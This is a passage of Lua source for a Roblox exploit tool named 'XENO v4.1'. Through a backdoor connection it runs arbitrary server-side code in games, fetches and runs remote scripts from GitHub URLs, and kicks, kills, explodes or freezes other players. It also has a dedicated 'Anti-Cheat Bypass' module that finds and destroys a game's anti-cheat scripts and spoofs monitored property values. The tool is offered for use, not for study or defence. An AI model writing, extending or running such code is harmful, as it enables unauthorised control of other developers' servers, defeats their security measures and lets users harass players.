    local rb=U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=rc},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(rb,"⚡ Require",T.Primary,1,function() local id=tonumber(ri.Text); if not id then Notify("Invalid",T.Err);return end; if not BD:isConnected() then Notify("Not connected!",T.Err);return end; Notify(BD:requireModule(id) and "Required: "..id or "Failed",BD:requireModule(id) and T.OK or T.Err) end)

    heading(pg,"URL Loader",3)
    local uc=card(pg,80,4); local ui=inputField(uc,"Raw script URL...",1); ui.Size=UDim2.new(1,0,0,30)
    local ub=U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=uc},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(ub,"🌐 Load",T.Accent,1,function() if ui.Text=="" then Notify("URL needed",T.Err);return end; if not BD:isConnected() then Notify("Not connected!",T.Err);return end; local ok=BD:loadUrl(ui.Text); Notify(ok and "Loaded" or "Failed",ok and T.OK or T.Err) end)

    heading(pg,"SS Executor",5)
    local ec=card(pg,145,6)
    local eb=U.new("TextBox",{Size=UDim2.new(1,0,0,88),BackgroundColor3=T.Surface,BorderSizePixel=0,Text="",PlaceholderText="-- Server-side Lua...",PlaceholderColor3=T.Sub,TextColor3=T.OK,TextSize=12,Font=Enum.Font.Code,TextXAlignment=Enum.TextXAlignment.Left,TextYAlignment=Enum.TextYAlignment.Top,MultiLine=true,ClearTextOnFocus=false,TextWrapped=true,Parent=ec},{U.new("UICorner",{CornerRadius=UDim.new(0,7)}),U.new("UIStroke",{Color=T.Border,Thickness=1,Transparency=0.4}),U.new("UIPadding",{PaddingTop=UDim.new(0,8),PaddingBottom=UDim.new(0,8),PaddingLeft=UDim.new(0,10),PaddingRight=UDim.new(0,10)})})
    local ebtns=U.new("Frame",{Size=UDim2.new(1,0,0,30),Position=UDim2.new(0,0,1,-30),BackgroundTransparency=1,Parent=ec},{U.new("UIListLayout",{FillDirection=Enum.FillDirection.Horizontal,Padding=UDim.new(0,8)})})
    actionBtn(ebtns,"▶ Execute",T.OK,1,function() if eb.Text=="" then Notify("Write code",T.Warn);return end; if not BD:isConnected() then Notify("Not connected!",T.Err);return end; local ok=BD:exec(eb.Text); Notify(ok and "Executed" or "Error",ok and T.OK or T.Err) end)
    actionBtn(ebtns,"🗑️ Clear",T.Sub,2,function() eb.Text="" end)

    heading(pg,"Script Hub",7)
    for idx,e in ipairs({
        {name="Infinite Yield",desc="Admin cmds",url="https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"},
        {name="Dex Explorer",desc="Object explorer",url="https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"},
        {name="Remote Spy",desc="Remote monitor",url="https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"},
    }) do
        local hc=card(pg,55,7+idx)
        U.new("TextLabel",{Size=UDim2.new(0.6,0,0,16),BackgroundTransparency=1,Text="📜 "..e.name,TextColor3=T.Text,TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=hc})
        U.new("TextLabel",{Size=UDim2.new(0.6,0,0,14),Position=UDim2.new(0,0,0,18),BackgroundTransparency=1,Text=e.desc,TextColor3=T.Sub,TextSize=11,Font=Enum.Font.Gotham,TextXAlignment=Enum.TextXAlignment.Left,Parent=hc})
        local hb=actionBtn(hc,"Execute",T.Primary,1,function() if not BD:isConnected() then Notify("Not connected!",T.Err);return end; local ok=BD:loadUrl(e.url); Notify(ok and "Loaded: "..e.name or "Failed",ok and T.OK or T.Err) end)
        hb.Position=UDim2.new(1,-110,0.5,-15)
    end
end

-- ═══════════════════════════════════════════════════
--  14 · SERVER PAGE
-- ═══════════════════════════════════════════════════

do
    local pg=pages.Server
    heading(pg,"Server Controls",1)
    local lc=card(pg,110,2)
    U.new("TextLabel",{Size=UDim2.new(1,0,0,16),BackgroundTransparency=1,Text="🌤️ Lighting",TextColor3=T.Text,TextSize=13,Font=Enum.Font.GothamBold,TextXAlignment=Enum.TextXAlignment.Left,Parent=lc})
    local lg=U.new("Frame",{Size=UDim2.new(1,0,0,70),Position=UDim2.new(0,0,0,22),BackgroundTransparency=1,Parent=lc},{U.new("UIGridLayout",{CellSize=UDim2.new(0,110,0,30),CellPadding=UDim2.new(0,6,0,6),SortOrder=Enum.SortOrder.LayoutOrder})})
    for i,sa in ipairs({{"☀️ Day",'game.Lighting.ClockTime=14',T.Warn},{"🌙 Night",'game.Lighting.ClockTime=0',T.Accent},{"🌫️ Fog On",'game.Lighting.FogEnd=80',T.Sub},{"🌫️ Fog Off",'game.Lighting.FogEnd=100000',T.Text},{"🔆 Bright",'game.Lighting.Brightness=3;game.Lighting.Ambient=Color3.new(1,1,1)',T.Warn},{"🌑 Dark",'game.Lighting.Brightness=0;game.Lighting.Ambient=Color3.new(0,0,0)',T.Sub}}) do
        actionBtn(lg,sa[1],sa[3],i,function() if not BD:isConnected() then Notify("Not connected!",T.Err);return end; BD:exec(sa[2]); Notify(sa[1].." applied",T.OK) end)
    end
    heading(pg,"Physics",3)
    local pc=card(pg,80,4); local gi=inputField(pc,"Gravity (196.2)...",1); gi.Size=UDim2.new(0.65,0,0,30)
    local gb=actionBtn(pc,"Set Gravity",T.Primary,2,function() if not BD:isConnected() then Notify("Not connected!",T.Err);return end; BD:exec("workspace.Gravity="..(tonumber(gi.Text) or 196.2)); Notify("Gravity set",T.OK) end)
    gb.Position=UDim2.new(0.68,0,0,0)
    heading(pg,"Server Actions",5)
    local mg=U.new("Frame",{Size=UDim2.new(1,0,0,80),BackgroundTransparency=1,LayoutOrder=6,Parent=pg},{U.new("UIGridLayout",{CellSize=UDim2.new(0,130,0,32),CellPadding=UDim2.new(0,6,0,6),SortOrder=Enum.SortOrder.LayoutOrder})})
    for i,ma in ipairs({
        {"🔒 Lock",function() BD:exec('game.Players.MaxPlayers=#game.Players:GetPlayers()'); Notify("Locked",T.OK) end,T.Warn},
        {"🔓 Unlock",function() BD:exec('game.Players.MaxPlayers=50'); Notify("Unlocked",T.OK) end,T.OK},
        {"💣 Shutdown",function() BD:exec('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("XENO") end'); Notify("Shutdown",T.Err) end,T.Err},
        {"💬 Message",function() BD:exec('local m=Instance.new("Message",workspace);m.Text="XENO v4.1";game:GetService("Debris"):AddItem(m,5)'); Notify("Sent",T.OK) end,T.Accent},
        {"🎵 Stop Music",function() BD:exec('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop();v:Destroy() end end'); Notify("Stopped",T.OK) end,T.Sub},
        {"🧹 Clean",function() BD:exec('for _,v in pairs(workspace:GetChildren()) do if not v:IsA("Terrain") and not v:IsA("Camera") and not game.Players:GetPlayerFromCharacter(v) then pcall(function() v:Destroy() end) end end'); Notify("Cleaned",T.OK) end,T.Err},
    }) do actionBtn(mg,ma[1],ma[3],i,function() if not BD:isConnected() then Notify("Not connected!",T.Err);return end; ma[2]() end) end
end

-- ═══════════════════════════════════════════════════
--  15 · ★ ANTI-CHEAT PAGE ★
-- ═══════════════════════════════════════════════════

do
    local pg = pages["Anti-Cheat"]
    heading(pg, "🛡️ Anti-Cheat Bypass", 1)

    local infoCard = card(pg, 100, 2)
    local acStatusLabel = U.new("TextLabel", {
        Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1,
        Text = table.concat({
            '<font color="#9399B2">Anti-Cheat Bypass Module v2.0</font>',
            '<font color="#9399B2">5-phase server-side AC neutralization:</font>',
            '',
            '<font color="#F9E2AF">Phase 1:</font> <font color="#9399B2">Kill ' .. #AC.scriptNames .. ' known AC script names</font>',
            '<font color="#F9E2AF">Phase 2:</font> <font color="#9399B2">Property spoof (sync "original" values)</font>',
            '<font color="#F9E2AF">Phase 3:</font> <font color="#9399B2">Heartbeat/loop AC neutralizer</font>',
            '<font color="#F9E2AF">Phase 4:</font> <font color="#9399B2">Game-specific pattern bypasses</font>',
            '<font color="#F9E2AF">Phase 5:</font> <font color="#9399B2">Continuous protection loop (kills respawning ACs)</font>',
        }, "\n"),
        TextColor3 = T.Sub, TextSize = 11, Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true, RichText = true, Parent = infoCard,
    })

    heading(pg, "Bypass Controls", 3)

    local controlCard = card(pg, 90, 4)
    local acResultLabel = U.new("TextLabel", {
        Size = UDim2.new(1,0,0,40), BackgroundTransparency = 1,
        Text = '<font color="#9399B2">Status: Inactive\nPress "Run Full Bypass" to begin.</font>',
        TextColor3 = T.Sub, TextSize = 12, Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true, RichText = true, Parent = controlCard,
    })

    local acBtns = U.new("Frame", {
        Size = UDim2.new(1,0,0,30), Position = UDim2.new(0,0,1,-30),
        BackgroundTransparency = 1, Parent = controlCard,
    }, {U.new("UIListLayout", {FillDirection = Enum.FillDirection.Horizontal, Padding = UDim.new(0,6), SortOrder = Enum.SortOrder.LayoutOrder})})

    actionBtn(acBtns, "🛡️ Full Bypass", T.OK, 1, function()
        if not BD:isConnected() then Notify("Not connected!", T.Err); return end

        acResultLabel.Text = '<font color="#F9E2AF">Running 5-phase bypass...</font>'
        Notify("🛡️ Running anti-cheat bypass...", T.Warn)

        task.spawn(function()
            local ok, result = AC:execute(BD)

            if ok then
                acResultLabel.Text = string.format(
                    '<font color="#A6E3A1">✓ Bypass active!</font>\n'
                    .. '<font color="#9399B2">Killed: %d scripts · Neutralized: %d remotes\n'
                    .. 'Continuous protection: running</font>',
                    result.killed, result.hooked
                )
                Notify("🛡️ AC Bypass active — " .. result.killed .. " scripts killed, "
                    .. result.hooked .. " remotes neutralized", T.OK, 6)
            else
                acResultLabel.Text = '<font color="#F3788C">Bypass failed — check connection</font>'
                Notify("AC Bypass failed", T.Err)
            end
        end)
    end)

    actionBtn(acBtns, "🔄 Sync Props", T.Accent, 2, function()
        if not BD:isConnected() then Notify("Not connected!", T.Err); return end
        AC:syncProperties(BD)
        Notify("Properties synced with AC values", T.OK)
    end)

    actionBtn(acBtns, "💀 Kill ACs", T.Err, 3, function()
        if not BD:isConnected() then Notify("Not connected!", T.Err); return end
        BD:exec(AC:buildKillCode())
        task.wait(0.8)
        local marker = RS:FindFirstChild("XENO_AC_RESULT")
        if marker then
            local parts = marker.Value:split(",")
            Notify("Killed " .. (parts[1] or "?") .. " AC scripts", T.OK)
            pcall(function() marker:Destroy() end)
        else
            Notify("Kill command sent", T.Warn)
        end
    end)

    heading(pg, "Manual AC Script Killer", 5)
    local manualAcCard = card(pg, 80, 6)
    U.new("TextLabel", {
        Size = UDim2.new(1,0,0,16), BackgroundTransparency = 1,
        Text = "Enter script name or path to disable:",
        TextColor3 = T.Sub, TextSize = 11, Font = Enum.Font.Gotham,
        TextXAlignment = Enum.TextXAlignment.Left, Parent = manualAcCard,
    })
    local acInput = inputField(manualAcCard, "e.g. AntiCheat or ServerScriptService.Security", 2)
    acInput.Size = UDim2.new(0.72, 0, 0, 30)
    acInput.Position = UDim2.new(0, 0, 1, -32)

    local acKillBtn = actionBtn(manualAcCard, "Kill Script", T.Err, 3, function()
        if not BD:isConnected() then Notify("Not connected!", T.Err); return end
        local target = acInput.Text
        if target == "" then Notify("Enter a name", T.Err); return end

        local code = string.format([[
pcall(function()
    local target = "%s"
    local killed = 0
    for _, svc in ipairs({
        game:GetService("ServerScriptService"),
        game:GetService("ServerStorage"),
        game:GetService("Workspace"),
        game:GetService("ReplicatedStorage"),
    }) do
        pcall(function()
            for _, obj in ipairs(svc:GetDescendants()) do
                if (obj:IsA("Script") or obj:IsA("ModuleScript") or obj:IsA("LocalScript")) then
                    if obj.Name == target or obj:GetFullName():find(target) then
                        pcall(function() obj.Disabled = true; obj:Destroy() end)
                        killed = killed + 1
                    end
                end
            end
        end)
    end
    local m = Instance.new("StringValue")
    m.Name = "XENO_MANUAL_KILL"
    m.Value = tostring(killed)
    m.Parent = game:GetService("ReplicatedStorage")
    game:GetService("Debris"):AddItem(m, 8)
end)
        ]], target)

        BD:exec(code)
        task.wait(0.8)
        local marker = RS:FindFirstChild("XENO_MANUAL_KILL")
        if marker then
            Notify("Killed " .. marker.Value .. " script(s) matching: " .. target, T.OK)
            pcall(function() marker:Destroy() end)
        else
            Notify("Kill sent for: " .. target, T.Warn)
        end
    end)
    acKillBtn.Position = UDim2.new(0.74, 4, 1, -32)

    heading(pg, "What This Bypasses", 7)
    local whatCard = card(pg, 160, 8)
    U.new("TextLabel", {
        Size = UDim2.new(1,0,1,0), BackgroundTransparency = 1,
        Text = table.concat({
            '<font color="#A6E3A1">✓ Server-side anti-cheat scripts</font>',
            '<font color="#A6E3A1">✓ WalkSpeed/JumpPower/Health monitors</font>',
            '<font color="#A6E3A1">✓ Heartbeat/loop-based detection</font>',
            '<font color="#A6E3A1">✓ Remote-based exploit reporting</font>',
            '<font color="#A6E3A1">✓ BindableEvent AC communication</font>',
            '<font color="#A6E3A1">✓ "Original value" comparison checks</font>',
            '<font color="#A6E3A1">✓ CharacterAdded re-check systems</font>',
            '<font color="#A6E3A1">✓ .Changed property monitors</font>',
            '<font color="#A6E3A1">✓ Folder-based AC frameworks</font>',
            '<font color="#A6E3A1">✓ Auto-respawning AC scripts (loop killer)</font>',
            '',
            '<font color="#F3788C">✗ Cannot bypass Byfron/Hyperion (kernel-level)</font>',
            '<font color="#F3788C">✗ Cannot bypass client-side AC (need local executor)</font>',
        }, "\n"),
        TextColor3 = T.Sub, TextSize = 11, Font = Enum.Font.Code,
        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Top,
        TextWrapped = true, RichText = true, Parent = whatCard,
    })
end

-- ═══════════════════════════════════════════════════
--  16 · COMMAND REGISTRY
-- ═══════════════════════════════════════════════════

local Commands = {}
local function reg(n,a,u,f) local e={name=n,aliases=a or {},usage=u or "",fn=f}; Commands[n:lower()]=e; for _,al in ipairs(a) do Commands[al:lower()]=e end end
local function ssRun(c) if not BD:isConnected() then Notify("Not connected!",T.Err); addHistory("✗ Not connected","#F3788C"); return false end; local ok,err=BD:exec(c); if not ok then addHistory("✗ "..tostring(err),"#F3788C") end; return ok end
local function pRef(n) return string.format('game.Players["%s"]',n) end

reg("kill",{"slay"},";kill <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character:BreakJoints() end)"); addHistory("→ kill "..p.Name,"#F3788C") end end)
reg("kick",{"boot"},";kick <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun(pRef(p.Name)..':Kick("XENO")'); addHistory("→ kick "..p.Name,"#F3788C") end end)
reg("god",{"godmode"},";god <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do local h=pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid")'; ssRun("pcall(function() "..h..".MaxHealth=math.huge;"..h..".Health=math.huge end)"); if AC.active then task.delay(0.3,function() AC:syncProperties(BD) end) end; addHistory("→ god "..p.Name,"#A6E3A1") end end)
reg("speed",{"ws"},";speed <plr> <n>",function(a) local v=tonumber(a[2]) or 100; for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed='..v.." end)"); if AC.active then task.delay(0.3,function() AC:syncProperties(BD) end) end; addHistory("→ speed "..p.Name.."="..v,"#B4A0FF") end end)
reg("jumppower",{"jp","jpower"},";jp <plr> <n>",function(a) local v=tonumber(a[2]) or 100; for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() local h="..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid");h.UseJumpPower=true;h.JumpPower='..v.." end)"); if AC.active then task.delay(0.3,function() AC:syncProperties(BD) end) end; addHistory("→ jp "..p.Name.."="..v,"#B4A0FF") end end)
reg("freeze",{"fr"},";freeze <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.Anchored=true end)"); addHistory("→ freeze "..p.Name,"#89B4FA") end end)
reg("thaw",{"unfreeze"},";thaw <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.Anchored=false end)"); addHistory("→ thaw "..p.Name,"#F9E2AF") end end)
reg("tp",{"teleport"},";tp <p1> <p2>",function(a) local f=U.findPlayers(a[1]); local t=U.findPlayers(a[2] or "me"); if #f==0 or #t==0 then return end; for _,p in ipairs(f) do ssRun("pcall(function() "..pRef(p.Name)..".Character.HumanoidRootPart.CFrame="..pRef(t[1].Name)..".Character.HumanoidRootPart.CFrame end)"); addHistory("→ tp "..p.Name.."→"..t[1].Name,"#B4A0FF") end end)
reg("ff",{"forcefield"},";ff <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun('Instance.new("ForceField",'..pRef(p.Name)..".Character)"); addHistory("→ ff "..p.Name,"#A6E3A1") end end)
reg("unff",{},";unff <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() for _,v in pairs("..pRef(p.Name)..'.Character:GetChildren()) do if v:IsA("ForceField") then v:Destroy() end end end)'); addHistory("→ unff "..p.Name,"#F3788C") end end)
reg("explode",{"boom"},";explode <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Explosion',workspace).Position="..pRef(p.Name)..".Character.HumanoidRootPart.Position end)"); addHistory("→ explode "..p.Name,"#F3788C") end end)
reg("fire",{},";fire <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Fire',"..pRef(p.Name)..".Character.HumanoidRootPart) end)"); addHistory("→ fire "..p.Name,"#F9E2AF") end end)
reg("sparkles",{"sp"},";sparkles <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Sparkles',"..pRef(p.Name)..".Character.HumanoidRootPart) end)"); addHistory("→ sparkles "..p.Name,"#B4A0FF") end end)
reg("smoke",{},";smoke <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() Instance.new('Smoke',"..pRef(p.Name)..".Character.HumanoidRootPart) end)"); addHistory("→ smoke "..p.Name,"#9399B2") end end)
reg("invisible",{"invis"},";invis <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() for _,v in pairs("..pRef(p.Name)..".Character:GetDescendants()) do if v:IsA('BasePart') then v.Transparency=1 end if v:IsA('Decal') then v.Transparency=1 end end end)"); addHistory("→ invis "..p.Name,"#9399B2") end end)
reg("visible",{"vis"},";visible <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() for _,v in pairs("..pRef(p.Name)..".Character:GetDescendants()) do if v:IsA('BasePart') and v.Name~='HumanoidRootPart' then v.Transparency=0 end if v:IsA('Decal') then v.Transparency=0 end end end)"); addHistory("→ visible "..p.Name,"#CDD6F4") end end)
reg("sit",{},";sit <plr>",function(a) for _,p in ipairs(U.findPlayers(a[1])) do ssRun("pcall(function() "..pRef(p.Name)..'.Character:FindFirstChildWhichIsA("Humanoid").Sit=true end)'); addHistory("→ sit "..p.Name,"#9399B2") end end)

reg("time",{"clocktime"},";time <n>",function(a) ssRun("game.Lighting.ClockTime="..(tonumber(a[1]) or 14)); addHistory("→ time="..(a[1] or "14"),"#F9E2AF") end)
reg("fog",{},";fog <n>",function(a) ssRun("game.Lighting.FogEnd="..(tonumber(a[1]) or 100000)); addHistory("→ fog="..(a[1] or "100000"),"#9399B2") end)
reg("gravity",{"grav"},";gravity <n>",function(a) ssRun("workspace.Gravity="..(tonumber(a[1]) or 196.2)); addHistory("→ gravity="..(a[1] or "196.2"),"#B4A0FF") end)
reg("music",{"play"},";music <id>",function(a) local id=tonumber(a[1]) or 0; ssRun('local s=Instance.new("Sound",workspace);s.SoundId="rbxassetid://'..id..'";s.Volume=1;s.Looped=true;s:Play()'); addHistory("→ music "..id,"#B4A0FF") end)
reg("stopmusic",{"stopsounds"},";stopmusic",function() ssRun('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop();v:Destroy() end end'); addHistory("→ stopped","#9399B2") end)
reg("message",{"msg"},";msg <text>",function(a) local t=table.concat(a," "); ssRun('local m=Instance.new("Message",workspace);m.Text="'..t..'";game:GetService("Debris"):AddItem(m,5)'); addHistory("→ msg: "..t,"#B4A0FF") end)
reg("hint",{},";hint <text>",function(a) local t=table.concat(a," "); ssRun('local h=Instance.new("Hint",workspace);h.Text="'..t..'";game:GetService("Debris"):AddItem(h,5)'); addHistory("→ hint: "..t,"#B4A0FF") end)
reg("shutdown",{"sd"},";shutdown",function() ssRun('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("XENO") end'); addHistory("→ SHUTDOWN","#F3788C") end)
reg("lockserver",{"lock"},";lock",function() ssRun("game.Players.MaxPlayers=#game.Players:GetPlayers()"); addHistory("→ locked","#F9E2AF") end)
reg("unlockserver",{"unlock"},";unlock",function() ssRun("game.Players.MaxPlayers=50"); addHistory("→ unlocked","#A6E3A1") end)

-- AC commands
reg("bypass",{"acbypass","anticheat"},";bypass",function()
    if not BD:isConnected() then Notify("Not connected!",T.Err); addHistory("✗ Not connected","#F3788C"); return end
    addHistory("→ Running AC bypass...","#F9E2AF")
    task.spawn(function()
        local ok, result = AC:execute(BD)
        if ok then
            addHistory("✓ AC Bypass active","#A6E3A1")
            addHistory("  Killed: "..result.killed.." scripts","#9399B2")
            addHistory("  Neutralized: "..result.hooked.." remotes","#9399B2")
            addHistory("  Loop protection: active","#9399B2")
        else
            addHistory("✗ Bypass failed","#F3788C")
        end
    end)
end)

reg("acstatus",{"acinfo"},";acstatus",function()
    if AC.active then
        addHistory("✓ Anti-Cheat Bypass: ACTIVE","#A6E3A1")
        addHistory("  Scripts killed: "..AC.killCount,"#9399B2")
        addHistory("  Remotes neutralized: "..AC.hookCount,"#9399B2")
        addHistory("  Loop protection: running","#9399B2")
    else
        addHistory("✗ Anti-Cheat Bypass: INACTIVE","#F3788C")
        addHistory("  Run ;bypass to activate","#9399B2")
    end
end)

reg("syncprops",{"sync"},";syncprops",function()
    if not BD:isConnected() then Notify("Not connected!",T.Err); return end
    AC:syncProperties(BD)
    addHistory("→ Properties synced","#A6E3A1")
end)

-- Utility
reg("require",{"req"},";require <id>",function(a) local id=tonumber(a[1]); if not id then Notify("Invalid",T.Err);return end; BD:requireModule(id); addHistory("→ require("..id..")","#B4A0FF") end)
reg("loadurl",{"url"},";loadurl <url>",function(a) local url=a[1] or ""; if url=="" then return end; BD:loadUrl(url); addHistory("→ loadurl: "..url:sub(1,50),"#B4A0FF") end)
reg("exec",{"execute","run"},";exec <code>",function(a) ssRun(table.concat(a," ")); addHistory("→ exec: "..table.concat(a," "):sub(1,60),"#A6E3A1") end)
reg("clear",{"cls"},";clear",function() cmdHistory={}; addHistory("Cleared","#9399B2") end)
reg("status",{"info"},";status",function()
    if BD:isConnected() then addHistory("✓ "..BD.active.name.." ["..BD.active.fingerprint.."]","#A6E3A1"); addHistory("  "..BD.active.patternName,"#9399B2")
    else addHistory("✗ Not connected","#F3788C") end
    addHistory("  AC: "..(AC.active and "ACTIVE" or "inactive"),"#9399B2")
end)
reg("scanstats",{"stats"},";scanstats",function() local s=BD.scanStats; addHistory("Scan: "..s.remotesScanned.." remotes in "..string.format("%.2fs",s.timeElapsed),"#B4A0FF") end)
reg("cmds",{"commands","help"},";cmds",function() local l={}; for _,e in pairs(Commands) do if not l[e] then addHistory(e.usage,"#B4A0FF"); l[e]=true end end end)

-- Input handler
cmdInput.FocusLost:Connect(function(enter)
    if not enter then return end; local raw=cmdInput.Text; cmdInput.Text=""
    if raw:sub(1,#CFG.Prefix)~=CFG.Prefix then return end
    local parts={}; for w in raw:sub(#CFG.Prefix+1):gmatch("%S+") do parts[#parts+1]=w end
    if #parts==0 then return end; local cn=table.remove(parts,1):lower()
    local entry=Commands[cn]
    if entry then addHistory(CFG.Prefix..cn.." "..table.concat(parts," "),"#8A2BE2"); local ok,err=pcall(entry.fn,parts); if not ok then addHistory("✗ "..tostring(err),"#F3788C") end
    else addHistory("✗ Unknown: "..cn,"#F3788C"); Notify("Unknown: "..cn,T.Err) end
end)

LP.Chatted:Connect(function(msg)
    if msg:sub(1,#CFG.Prefix)~=CFG.Prefix then return end
    local parts={}; for w in msg:sub(#CFG.Prefix+1):gmatch("%S+") do parts[#parts+1]=w end
    if #parts==0 then return end; local cn=table.remove(parts,1):lower()
    local entry=Commands[cn]; if entry then pcall(entry.fn,parts) end
end)

-- ═══════════════════════════════════════════════════
--  17 · KEYBIND
-- ═══════════════════════════════════════════════════

UIS.InputBegan:Connect(function(input,processed)
    if processed then return end
    if input.KeyCode==CFG.ToggleKey then
        main.Visible = not main.Visible
        if main.Visible then main.Size=UDim2.new(0,0,0,0); U.tween(main,{Size=UDim2.new(0,W.Width,0,W.Height)},0.4,Enum.EasingStyle.Back) end
    end
end)

-- ═══════════════════════════════════════════════════
--  18 · BOOT
-- ═══════════════════════════════════════════════════

do
    main.Size=UDim2.new(0,0,0,0); main.BackgroundTransparency=1
    task.wait(0.15)
    U.tween(main,{Size=UDim2.new(0,W.Width,0,W.Height),BackgroundTransparency=0},0.55,Enum.EasingStyle.Back)
    task.wait(0.6); switchTab("Dashboard")
    Notify("⚡ XENO v"..CFG.Version.." loaded",T.Primary)
    Notify("Throttled engine · "..#BD.patterns.." patterns · "..#BD.fingerprints.." fingerprints",T.Accent)
    Notify("🛡️ Anti-Cheat bypass ready — "..#AC.scriptNames.." AC signatures",T.OK)
    setStatus("Ready",T.Sub); statusValLbl.Text="Ready"; statusValLbl.TextColor3=T.Sub

    print(string.format([[
    ═══════════════════════════════════════
     ⚡ XENO v%s — Throttled + AC Bypass
     
     %d Fire Patterns · %d Fingerprints
     Fire Rate: %dms ± %dms (safe)
     AC Bypass: %d script signatures
     
     Toggle: RightShift | Prefix: %s
    ═══════════════════════════════════════
    ]],CFG.Version,#BD.patterns,#BD.fingerprints,CFG.FireDelay*1000,CFG.FireJitter*1000,#AC.scriptNames,CFG.Prefix))
end
